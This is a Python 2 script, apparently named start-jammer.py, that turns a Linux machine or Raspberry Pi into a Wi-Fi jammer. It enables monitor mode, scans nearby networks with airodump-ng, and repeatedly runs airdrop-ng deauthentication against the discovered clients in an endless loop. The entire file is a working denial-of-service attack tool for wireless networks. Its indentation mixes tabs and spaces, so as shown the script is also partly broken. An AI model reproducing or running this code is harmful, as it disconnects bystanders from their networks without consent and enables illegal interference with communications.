import time
import platform
import subprocess
import os
import sys
import signal
import csv
def first(inter):
        proc = subprocess.Popen(["sudo", "airodump-ng", inter, "--write", "pnp", "--output-format", "csv"])
        time.sleep(30)
        os.kill(proc.pid, signal.SIGTERM)
        filenames = ['pnp-01.csv']
        with open('./temp.csv','w') as outfile:
                for fname in filenames:
                        with open(fname) as infile:
                                for line in infile:
                                        outfile.write(line)
        os.remove('./pnp-01.csv')
def second(inter):
        process2 = subprocess.Popen(["sudo", "airdrop-ng", "-i", inter, "-t", "temp.csv", "-r","rulefile.txt"])
        time.sleep(120)
        os.kill(process2.pid, signal.SIGTERM)
        os.remove('./temp.csv')
def first1():
        process1 = subprocess.Popen(["sudo", "airodump-ng", "wlan0", "--write", "pnp", "--output-format","csv"])
        time.sleep(30)
        os.kill(process1.pid, signal.SIGTERM)
        filenames = ['pnp-01.csv']
        with open('./temp.csv','w') as outfile:
                for fname in filenames:
                        with open(fname) as infile:
                                for line in infile:
                                        outfile.write(line)
        os.remove('./pnp-01.csv')
def second1():
        process2 = subprocess.Popen(["sudo", "airdrop-ng", "-i", "wlan0", "-t", "temp.csv","-r","rulefile.txt"])
        time.sleep(120)
        os.kill(process2.pid, signal.SIGTERM)
        os.remove('./temp.csv')

if __name__ == '__main__':
	try:                
		os.system("rm -rf pnp*.csv")
                os.system("rm -rf temp*.csv")
                machine = platform.uname()[4]
		machine1 = platform.uname()[1]
                #print "Platform Name\t:\t"+ machine
                #os.system("echo","Choose your wireless interface") os.system("iwconfig")
                interface = sys.argv[1]
                if (machine == "x86_64"):
                        os.system("sudo airmon-ng start " + interface)
                        os.system("sudo airmon-ng check kill")
                        os.system("sudo airmon-ng start " + interface)
                        intermon = interface+"mon"
                        while(1):
                                first(intermon)
                                second(intermon)
                elif (machine1 == "raspberrypi3"):
			os.system("sudo insmod /root/brcmfmac.ko")
                        os.system("sudo ifconfig wlan0 up")
                        while(1):
                                first1()
                                second1()
		elif (machine == "armv6l"):
			os.system("monstart")
                        os.system("monstart")
                        while(1):
                                first1()
                                second1()		
                else:
                        print "System architecture not found"
	except IndexError:
		print "[*]\t Invalid Command:\n[*]\t Usage: python start-jammer.py <wireless interface>\n[*]\t python start-jammer.py wlan0"
		
